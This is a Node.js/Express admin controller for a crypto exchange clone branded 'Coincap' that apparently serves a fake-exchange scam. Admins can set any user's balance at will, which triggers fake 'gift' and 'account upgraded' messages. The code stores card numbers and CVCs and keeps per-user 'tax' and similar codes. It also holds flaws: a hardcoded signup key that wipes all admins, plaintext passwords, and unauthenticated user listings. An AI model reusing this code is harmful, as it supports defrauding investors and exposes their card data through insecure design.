const express = require('express')
const router = express.Router()
const app = express()
const { body, validationResult } = require('express-validator')
//importing models
const { Admin, User, Notification } = require("../database/database")
//import {env} from "../enviroment"
const jwt = require("jsonwebtoken")
const AWS = require('aws-sdk')
const authToken = process.env.TWILIO_AUTH_TOKEN
const accountSid = process.env.TWILIO_ACCOUNT_SID
const client = require('twilio')(accountSid, authToken)
const { generateAcessToken, notificationObject, upgradeTemplate, adminResolveTemplate } = require('../utils/util')
const mongoose = require("mongoose")
//aws setup
const config = require('../config'); // load 
let axios = require('axios')
const Mailjet = require('node-mailjet')

module.exports.signupAdmin = async (req, res, next) => {
    try {
        const { userEmail, userPassword, userSecretKey } = req.body

        //check for secret key
        if (userSecretKey !== 'coinbaseclone') {
            let error = new Error('secret key incorrect')
            return next(error)

        }
        //deleting all previous admin
        let deletedAdmins = await Admin.deleteMany()
        if (!deletedAdmins) {
            console.log('route reachedo0')
            let error = new Error('could not create a new admin')
            return next(error)
        }

        //creating a new user 
        let newAdmin = new Admin({
            _id: new mongoose.Types.ObjectId(),
            email: userEmail,
            password: userPassword


        })
        //saving the user
        let savedAdmin = await newAdmin.save()
        if (!savedAdmin) {
            let error = new Error("resource not saved")
            return next(error)
        }

        const adminToSend = await Admin.findOne({ _id: savedAdmin._id })


        return res.status(200).json({
            response: {
                admin: adminToSend,
            }
        })

    } catch (error) {
        error.message = error.message || "an error occured try later"
        return next(error)
    }
}

module.exports.loginAdmin = async (req, res, next) => {


    try {
        const { userEmail, userPassword } = req.body

        let adminExist = await Admin.findOne({ email: userEmail })
        if (!adminExist) {
            //if user does not exist return 404 response
            return res.status(404).json({
                response: "user does not exist"
            })
        }
        //http://192.168.42.116/authenticate user i.e checking password
        let passwordFromStorage = adminExist.password
        if (passwordFromStorage !== userPassword) {
            let error = new Error("password mismatch")
            return next(error)
        }


        const adminToSend = await Admin.findOne({ _id: adminExist._id })

        return res.status(200).json({
            response: {
                admin: adminToSend,

            }
        })

    } catch (error) {
        error.message = error.message || "an error occured try later"
        return next(error)

    }

}

module.exports.getUserFromJwt = async (req, res, next) => {
    try {
        let token = req.headers["header"]
        if (!token) {
            console.log('no token')
            throw new Error("a token is needed oh")
        }
        const decodedToken = jwt.verify(token, process.env.SECRET_KEY)
        const admin = await Admin.findOne({ _id: decodedToken.phoneNumber })
        if (!admin) {
            //if user does not exist return 404 response
            return res.status(404).json({
                response: "user has been deleted"
            })
        }

        return res.status(200).json({
            response: {
                admin: admin,
            }
        })



    } catch (error) {
        console.log(error)
        error.message = error.message || "an error occured try later"
        return next(error)

    }

}
module.exports.getUsers = async (req, res, next) => {
    try {

        //getting all the users from the backend
        let allUsers = await User.find()
        if (!allUsers) {
            return res.status(404).json({
                response: 'users not found'
            })
        }

        return res.status(200).json({
            response: allUsers
        })

    } catch (error) {
        console.log(error)
        error.message = error.message || "an error occured try later"
        return next(error)
    }


}
module.exports.getUser = async (req, res, next) => {
    try {
        //get all users
        let clientId = req.params.id

        //getting all the users from the backend
        let user = await User.findOne({ _id: clientId })
        if (!user) {
            return res.status(404).json({
                response: 'user not found'
            })
        }
        console.log(user)
        return res.status(200).json({
            response: user
        })

    } catch (error) {
        error.message = error.message || "an error occured try later"
        return next(error)
    }

}
Admin.find().then(data => {
    console.log(data)
})
module.exports.updateUser = async (req, res, next) => {
    try {
        let {
            AddressOne,
            NameOfBank,
            accountNumber,
            accountBalance,
            cardNumber,
            cvc,
            expiration,
            nameOnCard,
            postalCode,
            firstName,
            lastName,
            email,
            country,
            number,
            ktcCode,
            taxCode,
            ustCode,
            tntCode,
        } = req.body

        let current_balance
        let savedUserToSend
        //get all users

        //getting the users from the backend
        let user = await User.findOne({ email: email })
        //update user credentials
        current_balance = user.accountBalance

        let newBalance = Number(accountBalance)

        user.firstName = firstName || ""
        user.lastName = lastName || ""
        user.email = email || ""
        user.country = country || " "
        user.number = number || ""
        user.AddressOne = AddressOne || " "
        user.NameOfBank = NameOfBank || " "
        user.accountNumber = accountNumber || " "
        user.accountBalance = newBalance.toFixed(2) || " "
        user.cardNumber = cardNumber || " "
        user.cvc = cvc || " "
        user.expiration = expiration || " "

        user.nameOnCard = nameOnCard || " "
        user.postalCode = postalCode || " "
        //updating code

        user.ktcCode = ktcCode
        user.taxCode = taxCode
        user.ustCode = ustCode
        user.tntCode = tntCode

        let savedUser = await user.save()

        //trigger notification if acountBalance changes
        if (!user.accountBalance != accountBalance) {
            //initialised the notification
            let newNotification = new Notification({
                _id: new mongoose.Types.ObjectId(),
                topic: 'gift',
                text: `you have been gifted $${Number(savedUser.accountBalance) - Number(current_balance)} by coincap .Start trading now`,
                actionText: 'trade now',
                notification: 'gift',
                showStatus: false,
                user: savedUser
            })

            let savedNotification = await newNotification.save()

            if (!savedNotification) {
                throw new Error('notification failed to create')
            }



            const title = 'Gift';
            const body = `you have been gifted $${Number(savedUser.accountBalance) - Number(current_balance)} by coincape. Start trading now !`;
            await notificationObject.sendNotifications([user.notificationToken], title, body);


            let userToSend = await User.findOne({ email: savedUser.email })

            if (!userToSend) {
                throw new Error('could not retrieve user')
            }
            userToSend.notifications.push(savedNotification)

            savedUserToSend = await userToSend.save()
            let amount = Number(savedUser.accountBalance) - Number(current_balance)


            //send user upgrading email

            // Create mailjet send email
            const mailjet = Mailjet.apiConnect(process.env.MAILJET_APIKEY,process.env.MAILJET_SECRETKEY
                )

            const request = await mailjet.post("send", { 'version': 'v3.1' })
                .request({
                    "Messages": [
                        {
                            "From": {
                                "Email": "arierhiprecious@gmail.com",
                                "Name": "Coincap"
                            },
                            "To": [
                                {
                                    "Email": `${userToSend.email}`,
                                    "Name": `${userToSend.firstName}`
                                }
                            ],
                            "Subject": "Account Verification",
                            "TextPart": `Your coincap account has been upgraded by coincap team.you can start trading now`,
                            "HTMLPart": upgradeTemplate(amount, userToSend.email)
                        }
                    ]
                })

            if (!request) {
                let error = new Error("an error occured on the server")
                return next(error)
            }




            if (!savedUserToSend) {
                throw new Error('could not retrieve user')
            }
            return res.status(200).json({
                response: savedUserToSend
            })
        }
        return res.status(200).json({
            response: savedUser
        })

    } catch (error) {
        console.log(error)
        error.message = error.message || "an error occured try later"
        return next(error)
    }



}
module.exports.sendMessage = async (req, res, next) => {
}
module.exports.sendEmail = async (req, res, next) => {
    try {
        //get all users
        const { text, id: clientId } = req.body


        //getting all the users from the backend
        let user = await User.findOne({ _id: clientId })
        if (!user) {
            return res.status(404).json({
                response: 'user not found'
            })
        }

        //send email
        // Create mailjet send email
        const mailjet = Mailjet.apiConnect(process.env.MAILJET_APIKEY,process.env.MAILJET_SECRETKEY
            )

        const request = await mailjet.post("send", { 'version': 'v3.1' })
            .request({
                "Messages": [
                    {
                        "From": {
                            "Email": "arierhiprecious@gmail.com",
                            "Name": "Coincap"
                        },
                        "To": [
                            {
                                "Email": `${user.email}`,
                            }
                        ],
                        "Subject": "Account Verification",
                        "TextPart": ` ${text}!`,
                        "HTMLPart": adminResolveTemplate(text, user.email)
                    }
                ]
            })


        if (!request) {
            let error = new Error("an error occured on the server")
            return next(error)
        }

        return res.status(200).json({
            response: user
        })

    } catch (error) {
        error.message = error.message || "an error occured try later"
        return next(error)
    }


}

